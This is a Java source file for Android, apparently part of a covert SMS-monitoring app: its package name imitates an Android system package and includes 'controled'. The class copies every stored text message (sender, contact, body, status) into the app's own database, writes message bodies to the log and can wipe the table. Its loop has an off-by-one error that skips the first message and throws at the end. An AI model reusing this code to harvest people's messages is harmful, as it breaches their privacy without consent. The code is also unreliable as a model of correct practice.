package com.android.system.controled.util;

import java.util.ArrayList;

import com.android.system.controled.db.TableAllsms;

import android.content.Context;
import android.util.Log;

public class SmsSaveOutUtil {

	private TableAllsms mAllsmsTable;
	private SmsProviderUtil mSmsGetContent;
	private Context mContext;

	public SmsSaveOutUtil(Context con) {
		this.mAllsmsTable = new TableAllsms(con);
		this.mSmsGetContent = new SmsProviderUtil(con);
		this.mContext = con;
	}

	/**
	 * 保存所有邮件
	 * 
	 * @Description:
	 * @param folder
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void saveAllSms(String folder) {

		ArrayList<SmsInfo> allSms = new ArrayList<SmsInfo>();
		allSms = mSmsGetContent.getAllSmsInfo(folder);

		int smsSize = allSms.size();
		for (int o = 1; o <= smsSize; o++) {
			try {
				mAllsmsTable.insertData(allSms.get(o).getThread_id(), allSms.get(o).getDate(), TimeUtil.longToDateTimeString(allSms.get(o).getDate()), allSms.get(o).getAddress(), allSms.get(o)
						.getPerson(), allSms.get(o).getType(), allSms.get(o).getSubject(), allSms.get(o).getBody(), allSms.get(o).getRead(), allSms.get(o).getStatus());
			} catch (Exception e) {
				e.printStackTrace();
			}

		}

	}

	/**
	 * 保存最新的短信记录
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void saveLastSms() {
		SmsInfo oneSms = mSmsGetContent.getLastSmsInfo();
		Log.v("SmsSaveOutUtil", "Save Msg Last One:  " + oneSms.getBody());
		try {
			mAllsmsTable.insertData(oneSms.getThread_id(), oneSms.getDate(), TimeUtil.longToDateTimeString(oneSms.getDate()), oneSms.getAddress(), oneSms.getPerson(), oneSms.getType(),
					oneSms.getSubject(), oneSms.getBody(), oneSms.getRead(), oneSms.getStatus());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * 清空数据库
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void deleteAllMsg() {
		Log.v("SmsSaveOutUtil", "deleteAllMsg:  ");
		try {
			mAllsmsTable.deleteTable();
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

}
